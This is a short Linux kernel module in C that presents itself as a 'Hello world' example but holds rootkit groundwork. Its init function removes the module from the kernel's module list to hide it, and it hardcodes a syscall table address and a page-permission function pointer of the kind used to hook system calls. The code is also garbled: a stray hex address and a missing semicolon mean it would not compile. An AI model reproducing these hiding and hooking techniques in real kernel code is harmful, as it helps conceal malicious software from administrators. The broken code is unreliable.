#include <linux/module.h>
#include <linux/kernel.h>

void (*pages_rw)(struct page *page, int ) = (void *)0xc101cebf
0xc101cfc8

int init_module(void) {
	unsigned long *syscall_table = (unsigned long *)0xc12742a8;

	printk(KERN_INFO "Hello world 1.\n");
	list_del_init(&__this_module.list);

	return 0;
}

void cleanup_module(void) {
	printk(KERN_INFO "Goodbye world 1.\n");
}
